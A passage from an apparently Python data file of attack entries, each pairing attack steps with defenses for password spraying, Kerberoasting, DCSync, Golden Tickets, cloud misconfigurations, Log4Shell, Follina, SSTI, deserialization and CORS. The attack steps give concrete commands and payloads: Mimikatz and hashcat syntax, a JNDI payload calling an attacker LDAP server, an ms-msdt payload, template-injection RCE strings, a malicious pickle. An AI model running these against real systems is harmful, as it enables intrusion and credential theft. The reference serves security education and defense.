            "Conduct regular phishing simulation training for all staff.",
            "Train users to verify sender addresses and URLs before clicking.",
            "Implement domain monitoring to detect lookalike domains.",
            "Use hardware security keys (FIDO2) which are phishing-resistant.",
            "Enable email banners for external senders.",
            "Report suspicious emails to security team immediately.",
        ],
    },
    {
        "name": "Password Spraying",
        "aliases": ["password spray", "spraying", "spray attack", "slow brute force",
                    "common passwords attack", "365 spray", "azure spray"],
        "category": "Social Engineering",
        "risk": "HIGH",
        "tools": ["Spray", "MSOLSpray", "Ruler", "CrackMapExec", "Burp Intruder"],
        "cve_examples": [],
        "attack_steps": [
            "Enumerate valid usernames via OSINT (LinkedIn, email format guessing, error messages).",
            "Choose 1-3 common passwords: Season+Year (Winter2024), Company name + 123.",
            "Spray ONE password across ALL accounts — avoids lockout thresholds.",
            "Use MSOLSpray for Office 365: Invoke-MSOLSpray -UserList users.txt -Password Winter2024.",
            "Wait 30-60 minutes between sprays to reset lockout counters.",
            "Identify successful logins from error response differences.",
            "Use compromised account to pivot — access email, OneDrive, internal systems.",
            "Repeat spray with next password after waiting period.",
        ],
        "defense_steps": [
            "Enforce MFA on all accounts — especially internet-facing services.",
            "Implement smart lockout that triggers on spray patterns (many accounts, same password).",
            "Use Azure AD Password Protection to block common/weak passwords.",
            "Monitor for authentication failures across many accounts in short time windows.",
            "Use conditional access policies to block logins from unexpected locations.",
            "Enforce strong, unique passwords — prohibit Season+Year patterns.",
            "Enable identity protection alerts for spray attack signatures.",
            "Regularly audit accounts for weak passwords using internal password auditing tools.",
        ],
    },

    # ── CRYPTOGRAPHY ─────────────────────────────────────────────────────────
    {
        "name": "Hash Cracking",
        "aliases": ["hash crack", "crack hash", "crack password", "password hash", "md5 crack",
                    "sha1 crack", "rainbow table", "hashcat", "john the ripper"],
        "category": "Cryptography",
        "risk": "HIGH",
        "tools": ["Hashcat", "John the Ripper", "CrackStation", "Ophcrack"],
        "cve_examples": [],
        "attack_steps": [
            "Obtain hashes from a database dump, SAM file, /etc/shadow, or network capture.",
            "Identify the hash type: hash-identifier or hashid tool.",
            "Try online lookup: CrackStation, hashes.com for common hashes.",
            "Dictionary attack: hashcat -m <type> hashes.txt rockyou.txt.",
            "Rule-based attack: hashcat -m <type> hashes.txt wordlist.txt -r rules/best64.rule.",
            "Brute force short passwords: hashcat -m <type> hashes.txt -a 3 ?a?a?a?a?a?a.",
            "Use combinator attack: combine two wordlists for compound passwords.",
            "For Windows NTLM: hashcat -m 1000 hashes.txt rockyou.txt.",
            "For bcrypt: use smaller wordlists — bcrypt is slow by design.",
        ],
        "defense_steps": [
            "Use bcrypt, scrypt, or Argon2 for password hashing — never MD5 or SHA1.",
            "Use a unique salt per password to defeat rainbow tables.",
            "Set appropriate work factor (cost) to make cracking computationally expensive.",
            "Enforce strong password policies to prevent weak passwords from being set.",
            "Implement MFA so cracked passwords alone are insufficient.",
            "Protect the database containing password hashes — limit access strictly.",
            "Rotate hashes to stronger algorithms when upgrading systems.",
            "Monitor for large-scale login attempts using cracked credentials.",
        ],
    },

    # ── ACTIVE DIRECTORY ─────────────────────────────────────────────────────
    {
        "name": "Kerberoasting",
        "aliases": ["kerberoasting", "kerberoast", "spn attack", "service principal",
                    "kerberos attack", "ticket crack", "tgs crack"],
        "category": "Active Directory",
        "risk": "HIGH",
        "tools": ["Rubeus", "Impacket GetUserSPNs", "Hashcat", "BloodHound"],
        "cve_examples": [],
        "attack_steps": [
            "Gain any valid domain user account (even low-privileged).",
            "Enumerate Service Principal Names (SPNs): GetUserSPNs.py domain/user:pass -dc-ip <DC>.",
            "Request TGS tickets for discovered SPNs — no special privileges needed.",
            "Export tickets: GetUserSPNs.py domain/user:pass -dc-ip <DC> -request -outputfile hashes.txt.",
            "Or use Rubeus: Rubeus.exe kerberoast /outfile:hashes.txt.",
            "Crack tickets offline with Hashcat: hashcat -m 13100 hashes.txt rockyou.txt.",
            "Use cracked service account credentials to access associated services.",
            "Check if service account has high privileges (Domain Admin membership).",
            "Use BloodHound to map paths from compromised service account to Domain Admin.",
        ],
        "defense_steps": [
            "Use strong, random passwords (25+ chars) for all service accounts.",
            "Implement Group Managed Service Accounts (gMSA) — passwords auto-rotated by AD.",
            "Audit SPNs regularly — remove unused or unnecessary ones.",
            "Monitor for TGS requests for sensitive accounts (event ID 4769).",
            "Apply tiered admin model — service accounts should not have Domain Admin rights.",
            "Use AES encryption for Kerberos tickets instead of RC4 (weaker, faster to crack).",
            "Deploy Microsoft ATA or Defender for Identity to detect Kerberoasting activity.",
        ],
    },
    {
        "name": "AS-REP Roasting",
        "aliases": ["asrep roasting", "as-rep roasting", "asreproasting", "no preauth",
                    "kerberos preauth", "asrep attack"],
        "category": "Active Directory",
        "risk": "HIGH",
        "tools": ["Rubeus", "Impacket GetNPUsers", "Hashcat"],
        "cve_examples": [],
        "attack_steps": [
            "Identify accounts with 'Do not require Kerberos preauthentication' enabled.",
            "No credentials needed — AS-REP attack can be done unauthenticated.",
            "Request AS-REP for target accounts: GetNPUsers.py domain/ -usersfile users.txt -dc-ip <DC>.",
            "Or: Rubeus.exe asreproast /outfile:asrep_hashes.txt.",
            "Exported hash is encrypted with user's password — crack offline.",
            "Hashcat: hashcat -m 18200 asrep_hashes.txt rockyou.txt.",
            "Use cracked credentials to authenticate to domain resources.",
            "Pivot using compromised account to further enumerate AD.",
        ],
        "defense_steps": [
            "Enable Kerberos preauthentication on all accounts — audit and enforce via GPO.",
            "Regularly audit accounts with the 'Do not require Kerberos preauthentication' flag.",
            "Use strong passwords on all domain accounts to resist offline cracking.",
            "Monitor for AS-REP requests without preauthentication (event ID 4768 with type 0x0).",
            "Deploy Defender for Identity to detect AS-REP Roasting patterns.",
        ],
    },
    {
        "name": "DCSync Attack",
        "aliases": ["dcsync", "dc sync", "domain controller sync", "dump ntds", "replicate dc",
                    "get domain hashes", "dump all hashes", "ntds.dit"],
        "category": "Active Directory",
        "risk": "CRITICAL",
        "tools": ["Mimikatz", "Impacket secretsdump", "CrackMapExec"],
        "cve_examples": ["CVE-2020-1472 (Zerologon)"],
        "attack_steps": [
            "Obtain an account with Replicating Directory Changes permissions (usually Domain Admin).",
            "Use Mimikatz DCSync: lsadump::dcsync /domain:corp.local /user:krbtgt.",
            "Or dump all hashes: lsadump::dcsync /domain:corp.local /all /csv.",
            "Or use Impacket: secretsdump.py domain/admin:pass@<DC> -just-dc.",
            "Extract NTLM hashes for all domain accounts including krbtgt.",
            "Use krbtgt hash to forge Golden Tickets for persistent domain access.",
            "Pass-the-hash with extracted Domain Admin NTLM hashes.",
            "Crack extracted hashes offline to recover plaintext passwords.",
        ],
        "defense_steps": [
            "Restrict 'Replicating Directory Changes' permissions — only DCs should have them.",
            "Monitor for non-DC machines making replication requests (event ID 4662).",
            "Deploy Defender for Identity — specifically detects DCSync activity.",
            "Implement tiered admin model — limit accounts with replication privileges.",
            "Rotate krbtgt password twice to invalidate stolen hashes.",
            "Apply Just-In-Time (JIT) privileged access to reduce attack surface.",
            "Alert on large-scale LDAP queries or unusual directory replication events.",
        ],
    },
    {
        "name": "Golden Ticket Attack",
        "aliases": ["golden ticket", "forged ticket", "krbtgt attack", "kerberos persistence",
                    "forge kerberos", "persistent domain access"],
        "category": "Active Directory",
        "risk": "CRITICAL",
        "tools": ["Mimikatz", "Rubeus", "Impacket ticketer"],
        "cve_examples": [],
        "attack_steps": [
            "Compromise Domain Admin account or perform DCSync to get krbtgt hash.",
            "Retrieve krbtgt NTLM hash: lsadump::dcsync /user:krbtgt.",
            "Collect domain SID: whoami /user or Get-ADDomain.",
            "Forge Golden Ticket with Mimikatz: kerberos::golden /user:Administrator /domain:corp.local /sid:<SID> /krbtgt:<hash> /ticket:golden.kirbi.",
            "Load ticket into memory: kerberos::ptt golden.kirbi.",
            "Now have persistent Domain Admin access regardless of password changes.",
            "Access any resource in the domain using the forged ticket.",
            "Ticket is valid for 10 years by default — long-term persistence.",
        ],
        "defense_steps": [
            "Rotate krbtgt password twice (required to invalidate existing tickets).",
            "Implement Microsoft's krbtgt password rotation script for safe rotation.",
            "Monitor for Kerberos tickets with abnormally long lifetimes.",
            "Deploy Defender for Identity — detects golden ticket usage patterns.",
            "Alert on accounts logging in from unexpected systems or locations.",
            "Implement tiered admin model to limit krbtgt hash exposure.",
            "Regularly audit Domain Admin membership and privileged access.",
        ],
    },
    {
        "name": "BloodHound AD Enumeration",
        "aliases": ["bloodhound", "ad enumeration", "active directory enumeration", "sharphound",
                    "ad attack path", "domain enumeration", "ad recon"],
        "category": "Active Directory",
        "risk": "HIGH",
        "tools": ["BloodHound", "SharpHound", "ADRecon", "ldapdomaindump"],
        "cve_examples": [],
        "attack_steps": [
            "Obtain any valid domain user credentials.",
            "Run SharpHound collector: SharpHound.exe -c All --zipfilename output.zip.",
            "Or use Python collector: bloodhound-python -u user -p pass -d domain -c All.",
            "Import ZIP file into BloodHound GUI.",
            "Run pre-built queries: 'Find Shortest Path to Domain Admin'.",
            "Identify users with DCSync rights, unconstrained delegation, etc.",
            "Find Kerberoastable and AS-REP-Roastable accounts.",
            "Map attack paths from current account to Domain Admin.",
            "Identify over-privileged accounts and groups for lateral movement.",
        ],
        "defense_steps": [
            "Monitor for high-volume LDAP queries from non-DC hosts.",
            "Limit LDAP query access — restrict what unprivileged users can enumerate.",
            "Apply tiered admin model to eliminate shortest paths to Domain Admin.",
            "Regularly run BloodHound internally to find and fix attack paths before attackers do.",
            "Remove excessive group memberships and privileged access.",
            "Disable unconstrained delegation where possible.",
            "Deploy Defender for Identity to detect enumeration activity.",
        ],
    },

    # ── CLOUD ─────────────────────────────────────────────────────────────────
    {
        "name": "AWS S3 Misconfiguration",
        "aliases": ["s3 bucket", "s3 misconfiguration", "public s3", "s3 exposure",
                    "open bucket", "cloud storage", "aws bucket", "s3 leak"],
        "category": "Cloud",
        "risk": "HIGH",
        "tools": ["awscli", "S3Scanner", "GrayhatWarfare", "Pacu", "Bucket Finder"],
        "cve_examples": [],
        "attack_steps": [
            "Enumerate target S3 buckets: guess names from company name + common suffixes (backup, data, logs).",
            "Use S3Scanner: python3 s3scanner.py --buckets-file wordlist.txt.",
            "Check public access: aws s3 ls s3://bucket-name --no-sign-request.",
            "Download all files from public bucket: aws s3 sync s3://bucket-name . --no-sign-request.",
            "Look for sensitive files: .env, credentials, config files, backups, private keys.",
            "Check bucket ACLs and policies for misconfigured permissions.",
            "If write access: upload a malicious file or deface hosted content.",
            "Check for server-side logs with sensitive info (access tokens, API keys in URLs).",
            "Use metadata from exposed files to plan further attacks.",
        ],
        "defense_steps": [
            "Enable S3 Block Public Access at both bucket and account level.",
            "Apply strict bucket policies — default deny, allow only necessary principals.",
            "Enable S3 Object Ownership to disable ACL-based access.",
            "Enable CloudTrail logging for all S3 API calls.",
            "Enable Amazon Macie to automatically detect sensitive data in S3.",
            "Rotate any credentials or API keys found in exposed buckets immediately.",
            "Use AWS Config rules to detect and alert on public bucket configurations.",
            "Enforce encryption at rest and in transit for all S3 buckets.",
            "Regularly audit bucket policies and ACLs with automated tools.",
        ],
    },
    {
        "name": "AWS IAM Privilege Escalation",
        "aliases": ["iam privesc", "aws privesc", "cloud privesc", "aws privilege escalation",
                    "iam escalation", "aws iam attack", "cloud privilege"],
        "category": "Cloud",
        "risk": "CRITICAL",
        "tools": ["Pacu", "enumerate-iam", "aws_consoler", "cloudsplaining", "AWSPX"],
        "cve_examples": [],
        "attack_steps": [
            "Gain initial AWS credentials (from S3 exposure, SSRF, hardcoded keys, phishing).",
            "Enumerate current permissions: aws sts get-caller-identity.",
            "Use enumerate-iam to bruteforce allowed API calls.",
            "Check for iam:CreatePolicyVersion — attach a new admin policy version.",
            "Check for iam:AttachUserPolicy — attach AdministratorAccess to self.",
            "Check for iam:PassRole + ec2:RunInstances — launch EC2 with admin role.",
            "Check for lambda:CreateFunction + iam:PassRole — create Lambda with privileged role.",
            "Use Pacu framework for automated AWS privilege escalation: run iam__privesc_scan.",
            "Escalate to AdministratorAccess and create persistent backdoor IAM user.",
            "Access all AWS services: EC2, RDS, Secrets Manager, SSM for lateral movement.",
        ],
        "defense_steps": [
            "Apply least-privilege IAM policies — never use AdministratorAccess for service accounts.",
            "Enable AWS Organizations Service Control Policies (SCP) to enforce boundaries.",
            "Use IAM Access Analyzer to identify overly permissive policies.",
            "Enable CloudTrail with CloudWatch alarms for sensitive IAM actions.",
            "Require MFA for all human IAM users, especially for console access.",
            "Rotate access keys regularly and delete unused ones.",
            "Use IAM roles instead of long-term access keys for EC2/Lambda.",
            "Enable AWS Config to detect policy changes.",
            "Conduct regular IAM reviews with tools like cloudsplaining or Prowler.",
        ],
    },
    {
        "name": "Kubernetes Attack",
        "aliases": ["kubernetes", "k8s", "container attack", "pod escape", "kubectl attack",
                    "k8s privesc", "kubernetes privesc", "etcd attack", "k8s misconfiguration"],
        "category": "Cloud",
        "risk": "CRITICAL",
        "tools": ["kubectl", "kube-hunter", "kubesploit", "Peirates", "CDK"],
        "cve_examples": ["CVE-2018-1002105", "CVE-2022-0185", "CVE-2021-25741"],
        "attack_steps": [
            "Gain access to a pod via RCE in a containerized application.",
            "Check mounted service account token: cat /var/run/secrets/kubernetes.io/serviceaccount/token.",
            "Use token to query API server: kubectl --token=<token> auth can-i --list.",
            "Check for overly permissive roles: can-i create pods, get secrets, exec.",
            "List secrets in accessible namespaces: kubectl get secrets -A.",
            "Mount host filesystem via privileged pod: kubectl apply -f privesc-pod.yaml.",
            "Escape to host node via privileged container with host PID/network.",
            "Access etcd directly if exposed: read all secrets including service account tokens.",
            "Enumerate cluster for misconfigured RBAC roles across namespaces.",
            "Use kubesploit or Peirates for automated K8s post-exploitation.",
        ],
        "defense_steps": [
            "Apply least-privilege RBAC — avoid cluster-admin for service accounts.",
            "Disable automounting of service account tokens where not needed.",
            "Use Network Policies to restrict pod-to-pod and pod-to-API communication.",
            "Run containers as non-root with read-only filesystem where possible.",
            "Disable privileged containers and host namespace sharing in PodSecurityPolicy.",
            "Encrypt etcd at rest and restrict direct access to it.",
            "Enable audit logging for Kubernetes API server.",
            "Use runtime security tools (Falco) to detect suspicious container activity.",
            "Regularly scan images for vulnerabilities and use only trusted registries.",
            "Run kube-hunter and kube-bench to detect misconfigurations.",
        ],
    },
    {
        "name": "Cloud Metadata SSRF",
        "aliases": ["metadata ssrf", "imds attack", "cloud metadata", "169.254.169.254",
                    "aws metadata", "gcp metadata", "azure metadata", "instance metadata"],
        "category": "Cloud",
        "risk": "CRITICAL",
        "tools": ["curl", "Burp Suite", "SSRFmap"],
        "cve_examples": ["CVE-2019-11043", "CVE-2021-26855"],
        "attack_steps": [
            "Find SSRF vulnerability in the web application (URL fetch, webhooks, PDF generators).",
            "Query AWS metadata service: http://169.254.169.254/latest/meta-data/.",
            "Get IAM credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>.",
            "For GCP: http://metadata.google.internal/computeMetadata/v1/ (needs Metadata-Flavor header).",
            "For Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01.",
            "Extract access key ID, secret key, and session token from IAM role response.",
            "Configure awscli with stolen credentials: aws configure.",
            "Enumerate all AWS resources accessible with the stolen role.",
            "Escalate via IAM privilege escalation with obtained credentials.",
        ],
        "defense_steps": [
            "Use IMDSv2 (AWS) — requires session token, blocking simple SSRF-based metadata access.",
            "Block access to 169.254.169.254 at the application/network layer.",
            "Validate and restrict URLs the application is allowed to fetch.",
            "Apply least-privilege IAM roles to EC2/compute instances.",
            "Monitor CloudTrail for API calls using instance metadata credentials from unexpected IPs.",
            "Use GCP Workload Identity Federation / Azure Managed Identity with strict scopes.",
            "Deploy WAF rules to detect SSRF patterns targeting metadata endpoints.",
        ],
    },

    # ── MODERN EXPLOITS ──────────────────────────────────────────────────────
    {
        "name": "Log4Shell (Log4j RCE)",
        "aliases": ["log4shell", "log4j", "log4j rce", "jndi injection", "log4j exploit",
                    "cve-2021-44228", "log4j vulnerability", "jndi attack"],
        "category": "Modern Exploits",
        "risk": "CRITICAL",
        "tools": ["custom payloads", "marshalsec", "JNDI-Exploit-Kit", "Burp Suite"],
        "cve_examples": ["CVE-2021-44228", "CVE-2021-45046", "CVE-2021-45105"],
        "attack_steps": [
            "Identify Java applications using Log4j 2.0-beta9 to 2.14.1.",
            "Find any input that gets logged: HTTP headers (User-Agent, X-Forwarded-For), form fields.",
            "Inject JNDI payload: ${jndi:ldap://<attacker-ip>:1389/exploit}.",
            "Set up malicious LDAP server: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://<ip>:8888/#Exploit'.",
            "Host malicious Java class on HTTP server.",
            "When server logs the payload, it fetches and executes your class — RCE achieved.",
            "Gain reverse shell on the vulnerable server.",
            "Test all input vectors: headers, body params, JSON fields, URL parameters.",
            "Use obfuscated payloads to bypass WAF: ${${lower:j}ndi:ldap://...}.",
        ],
        "defense_steps": [
            "Upgrade Log4j to 2.17.1 or later immediately.",
            "If patching is not immediate: set log4j2.formatMsgNoLookups=true as JVM argument.",
            "Block outbound LDAP/RMI traffic from application servers at firewall level.",
            "Deploy WAF rules to detect JNDI injection patterns in requests.",
            "Scan your environment for vulnerable Log4j versions using tools like log4j-scan.",
            "Audit all Java applications and their dependencies for Log4j usage.",
            "Apply network segmentation — application servers should not initiate external connections.",
            "Monitor for unusual outbound DNS and LDAP requests from servers.",
        ],
    },
    {
        "name": "PrintNightmare",
        "aliases": ["printnightmare", "print spooler", "spooler exploit", "windows print exploit",
                    "cve-2021-34527", "spoolsv exploit", "printer exploit"],
        "category": "Modern Exploits",
        "risk": "CRITICAL",
        "tools": ["cube0x0/CVE-2021-1675", "SharpPrintNightmare", "Impacket"],
        "cve_examples": ["CVE-2021-34527", "CVE-2021-1675"],
        "attack_steps": [
            "Verify Windows Print Spooler service is running on target: sc query spooler.",
            "Check if target is vulnerable — unpatched Windows systems prior to July 2021.",
            "For local privesc: use SharpPrintNightmare to load malicious DLL via Print Spooler.",
            "For remote RCE: Invoke-Nightmare -DLL 'C:\\malicious.dll' remotely via SMB.",
            "Or use Python: CVE-2021-1675.py domain/user:pass@<target> '\\\\attacker\\share\\evil.dll'.",
            "Set up SMB server hosting malicious DLL: smbserver.py share /path/to/dll.",
            "DLL is loaded by SYSTEM-level Print Spooler — immediate SYSTEM shell.",
            "Add a new Domain Admin account via the SYSTEM shell.",
        ],
        "defense_steps": [
            "Apply Microsoft's July 2021 cumulative update patches immediately.",
            "Disable Print Spooler on systems that do not need printing: Stop-Service Spooler.",
            "Block outbound SMB (port 445) from servers to prevent remote DLL loading.",
            "Restrict Point and Print to approved print servers only via GPO.",
            "Disable Point and Print if not required: Computer Configuration > Policies > Administrative Templates.",
            "Monitor for unusual DLL loads by spoolsv.exe process.",
            "Use Windows Defender Attack Surface Reduction rules.",
        ],
    },
    {
        "name": "Follina (MSDT RCE)",
        "aliases": ["follina", "msdt", "word exploit", "office exploit", "cve-2022-30190",
                    "ms-msdt", "office rce", "word rce", "msdt exploit"],
        "category": "Modern Exploits",
        "risk": "CRITICAL",
        "tools": ["custom Word/RTF files", "Burp Suite", "PowerShell"],
        "cve_examples": ["CVE-2022-30190"],
        "attack_steps": [
            "Create a malicious Word (.docx) or RTF file containing a remote OLE object reference.",
            "The document references an HTML file hosted on attacker server via ms-msdt URI scheme.",
            "Craft HTML file with ms-msdt payload: ms-msdt:/id PCWDiagnostic /skip force /param \"IT_BrowseForFile=..$(Invoke-Expression(\"calc\"))\".",
            "Victim opens Word document — no macros needed, preview pane triggers exploit.",
            "MSDT (Microsoft Support Diagnostic Tool) executes attacker's command as the user.",
            "Deliver reverse shell payload via PowerShell in the ms-msdt parameter.",
            "Gain code execution in victim's context without UAC prompts.",
            "Use for initial access — pivot to privilege escalation for persistence.",
        ],
        "defense_steps": [
            "Apply Microsoft's June 2022 security patches.",
            "Disable MSDT URL protocol as temporary mitigation: reg delete HKEY_CLASSES_ROOT\\ms-msdt /f.",
            "Block ms-msdt:// URI scheme via Group Policy.",
            "Disable Protected View bypass — ensure Protected View is enabled for Office files.",
            "Block outbound HTTP from Office applications via firewall rules.",
            "Use Microsoft Defender with up-to-date signatures — detects Follina exploitation.",
            "Train users not to open unsolicited documents even without enabling macros.",
        ],
    },
    {
        "name": "ProxyShell / ProxyLogon (Exchange)",
        "aliases": ["proxyshell", "proxylogon", "exchange exploit", "exchange rce",
                    "cve-2021-26855", "cve-2021-34473", "microsoft exchange attack",
                    "exchange server vulnerability"],
        "category": "Modern Exploits",
        "risk": "CRITICAL",
        "tools": ["custom exploits", "Metasploit", "nuclei templates"],
        "cve_examples": ["CVE-2021-26855", "CVE-2021-26857", "CVE-2021-27065",
                         "CVE-2021-34473", "CVE-2021-34523", "CVE-2021-31207"],
        "attack_steps": [
            "Identify Microsoft Exchange servers via Shodan, Censys, or internal recon.",
            "Check Exchange version — ProxyLogon affects Exchange 2013-2019 before March 2021 patch.",
            "ProxyLogon: exploit SSRF (CVE-2021-26855) to bypass authentication.",
            "Chain with deserialization (CVE-2021-26857) to run code as SYSTEM.",
            "Or write web shell via CVE-2021-27065 (post-auth arbitrary file write).",
            "ProxyShell: chain auth bypass + arbitrary write to drop webshell on Exchange.",
            "Access webshell at /aspnet_client/<webshell>.aspx.",
            "Execute commands as SYSTEM on the Exchange server.",
            "Dump emails, steal credentials, move laterally to Active Directory.",
        ],
        "defense_steps": [
            "Apply March 2021 (ProxyLogon) and April/May 2021 (ProxyShell) cumulative updates.",
            "If patching is delayed: apply Microsoft's Emergency Mitigation Service.",
            "Block unauthenticated inbound connections to Exchange where possible.",
            "Monitor for webshell creation in Exchange directories.",
            "Use Microsoft's MSERT tool to scan for webshells.",
            "Enable Extended Protection for Authentication on Exchange.",
            "Monitor Exchange logs for unusual EWS/OWA/Autodiscover requests.",
        ],
    },

    # ── WEB (MODERN) ─────────────────────────────────────────────────────────
    {
        "name": "Server-Side Template Injection (SSTI)",
        "aliases": ["ssti", "template injection", "server side template injection",
                    "jinja injection", "twig injection", "freemarker injection",
                    "template rce", "inject template"],
        "category": "Web",
        "risk": "CRITICAL",
        "tools": ["Burp Suite", "tplmap", "manual payloads"],
        "cve_examples": ["CVE-2019-9193", "CVE-2021-26291"],
        "attack_steps": [
            "Find input fields that are rendered by a template engine (name, greeting, email body).",
            "Test with math expression: {{7*7}} — if output is 49, template injection confirmed.",
            "Try engine-specific payloads: {{7*'7'}} for Jinja2 (returns 7777777).",
            "Identify template engine from responses and error messages.",
            "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}.",
            "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}.",
            "Freemarker RCE: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}.",
            "Escalate to full RCE — read files, write webshells, reverse shell.",
        ],
        "defense_steps": [
            "Never pass user input directly into template rendering functions.",
            "Use a sandboxed template environment that restricts access to dangerous objects.",
            "Validate and sanitize all input before using it in templates.",
            "Use logic-less templates (Mustache) which do not support code execution.",
            "Apply WAF rules to detect template injection syntax patterns.",
            "Run application with least-privilege OS user to limit impact of RCE.",
            "Conduct code review specifically for template rendering with user-controlled data.",
        ],
    },
    {
        "name": "HTTP Request Smuggling",
        "aliases": ["request smuggling", "http smuggling", "cl te", "te cl", "te te",
                    "desync attack", "http desync", "chunked encoding attack"],
        "category": "Web",
        "risk": "HIGH",
        "tools": ["Burp Suite HTTP Request Smuggler", "smuggler.py", "manual crafting"],
        "cve_examples": ["CVE-2019-18277", "CVE-2020-11724"],
        "attack_steps": [
            "Identify targets using a front-end/back-end server architecture (CDN, load balancer + app).",
            "Test for CL.TE desync: send request with both Content-Length and Transfer-Encoding headers.",
            "Front-end uses Content-Length, back-end uses Transfer-Encoding — smuggle prefix.",
            "Use Burp's HTTP Request Smuggler extension to automate detection.",
            "Craft smuggled request that poisons the next victim's request on the back-end.",
            "Capture other users' requests by smuggling a partial request and poisoning the queue.",
            "Bypass front-end access controls by smuggling requests to restricted back-end paths.",
            "Perform XSS via reflected request smuggling.",
            "Steal session cookies from other users' smuggled requests.",
        ],
        "defense_steps": [
            "Normalize ambiguous requests at the front-end — reject requests with both CL and TE.",
            "Ensure front-end and back-end use the same method to determine request length.",
            "Use HTTP/2 end-to-end where possible — eliminates CL/TE ambiguity.",
            "Disable backend connection reuse or use per-request connections.",
            "Keep reverse proxies and web servers updated to patched versions.",
            "Use a WAF that understands HTTP request smuggling patterns.",
            "Test with Burp Suite's HTTP Request Smuggler before production deployment.",
        ],
    },
    {
        "name": "GraphQL Injection",
        "aliases": ["graphql", "graphql injection", "graphql attack", "graphql introspection",
                    "graphql sqli", "api injection graphql"],
        "category": "Web",
        "risk": "HIGH",
        "tools": ["Burp Suite", "InQL", "GraphQL Voyager", "Altair", "clairvoyance"],
        "cve_examples": [],
        "attack_steps": [
            "Find GraphQL endpoint: /graphql, /api/graphql, /v1/graphql.",
            "Run introspection query to dump the entire schema: {__schema{types{name,fields{name}}}}.",
            "Map all queries, mutations, and types from the schema.",
            "Look for sensitive queries: getUser, getAdminData, getAllUsers.",
            "Test IDOR by querying other users' data with different IDs.",
            "Inject SQL via GraphQL arguments if backend uses dynamic queries.",
            "Test for excessive data exposure — API may return more fields than UI shows.",
            "Batch queries to bypass rate limiting: send 1000 login attempts in one request.",
            "Look for disabled mutations that are still accessible via direct API calls.",
        ],
        "defense_steps": [
            "Disable introspection in production environments.",
            "Implement field-level authorization — check permissions for every field resolved.",
            "Apply query depth and complexity limits to prevent abuse.",
            "Rate-limit GraphQL requests — batching should not bypass limits.",
            "Use persisted queries to whitelist allowed queries in production.",
            "Validate and sanitize all GraphQL inputs server-side.",
            "Log all GraphQL queries and monitor for unusual patterns.",
            "Use tools like GraphQL Shield for declarative authorization rules.",
        ],
    },
    {
        "name": "OAuth Misconfiguration",
        "aliases": ["oauth attack", "oauth misconfiguration", "oauth exploit", "open redirect oauth",
                    "token hijacking oauth", "oauth bypass", "sso attack", "oauth csrf"],
        "category": "Web",
        "risk": "HIGH",
        "tools": ["Burp Suite", "browser dev tools", "custom scripts"],
        "cve_examples": ["CVE-2022-22965", "CVE-2021-27928"],
        "attack_steps": [
            "Find OAuth login flow — identify authorization endpoint and redirect_uri.",
            "Test open redirect: modify redirect_uri to attacker domain — if allowed, steal auth code.",
            "Test CSRF in OAuth flow: initiate auth without state parameter — replay on victim.",
            "Try implicit flow token leakage via Referer header or browser history.",
            "Check if authorization code is accepted multiple times (no invalidation).",
            "Test for scope escalation: add extra scopes to authorization request.",
            "Check if client_secret is exposed in JavaScript or mobile app.",
            "Test for account takeover via pre-authentication: link attacker OAuth account.",
            "Exploit misconfigured redirect_uri validation (path traversal, subdomain matching).",
        ],
        "defense_steps": [
            "Enforce strict redirect_uri validation — exact match only, no wildcards.",
            "Implement and validate the state parameter (CSRF token) in all OAuth flows.",
            "Use PKCE (Proof Key for Code Exchange) for all public clients.",
            "Invalidate authorization codes after single use and set short expiry.",
            "Use short-lived access tokens and rotate refresh tokens on each use.",
            "Never expose client_secret in client-side code or mobile apps.",
            "Limit scopes to minimum required permissions.",
            "Implement token binding where possible to prevent token theft.",
        ],
    },
    {
        "name": "Insecure Deserialization",
        "aliases": ["deserialization", "deserialize attack", "java deserialization",
                    "pickle deserialization", "object injection", "ysoserial",
                    "php deserialization", "python pickle", "insecure deserialization"],
        "category": "Web",
        "risk": "CRITICAL",
        "tools": ["ysoserial", "PHPGGC", "pickle exploit", "Burp Suite", "SerializationDumper"],
        "cve_examples": ["CVE-2015-4852", "CVE-2017-9805 (Struts2)", "CVE-2019-2725 (WebLogic)"],
        "attack_steps": [
            "Identify serialized objects in cookies, request body, or hidden fields (Java: rO0AB, PHP: O:, Python: \\x80\\x04).",
            "Determine serialization format and language (Java, PHP, Python, .NET).",
            "For Java: use ysoserial to generate payload: java -jar ysoserial.jar CommonsCollections1 'id' > payload.ser.",
            "Submit payload where serialized data is accepted.",
            "Monitor for command execution on server side.",
            "For Python pickle: craft malicious pickle: class Exploit: def __reduce__(self): return (os.system, ('id',)).",
            "For PHP: use PHPGGC to generate gadget chains targeting installed libraries.",
            "Escalate to reverse shell from initial command execution.",
            "Chain with file write to drop webshell for persistence.",
        ],
        "defense_steps": [
            "Avoid deserializing untrusted data — use safer formats like JSON with strict validation.",
            "Implement deserialization filters (Java 9+ ObjectInputFilter) to whitelist allowed classes.",
            "Sign and verify serialized data with HMAC to detect tampering.",
            "Update Java, PHP, and libraries to versions that fix known gadget chains.",
            "Run applications with minimal permissions to limit impact.",
            "Use Java agents (NotSoSerial, SerialKiller) to block dangerous deserialization.",
            "Monitor for unexpected process spawning from application server processes.",
        ],
    },
    {
        "name": "CORS Misconfiguration",
        "aliases": ["cors", "cross origin", "cors misconfiguration", "cors attack",
                    "cors exploit", "access control allow origin"],
        "category": "Web",
        "risk": "HIGH",
        "tools": ["Burp Suite", "CORStest", "browser dev tools", "curl"],
        "cve_examples": [],
        "attack_steps": [
            "Find API endpoints that return sensitive data.",
            "Send request with Origin: https://attacker.com header.",
            "Check response for Access-Control-Allow-Origin: https://attacker.com.",
            "Also check if Access-Control-Allow-Credentials: true is set.",
            "If both present: host malicious JavaScript to make cross-origin requests.",
            "JS fetches sensitive API on behalf of logged-in victim: fetch('https://target.com/api/profile', {credentials: 'include'}).",
            "Read response and exfiltrate to attacker server.",
            "Test null origin: Origin: null — some servers reflect null origin.",
            "Test subdomain confusion: evil.target.com if wildcard *.target.com is allowed.",
        ],
        "defense_steps": [
            "Set Access-Control-Allow-Origin to specific trusted domains — never use *  with credentials.",
            "Never reflect the Origin header directly without validation.",
            "Maintain a whitelist of allowed origins and validate strictly.",
            "Do not send Access-Control-Allow-Credentials: true unless necessary.",
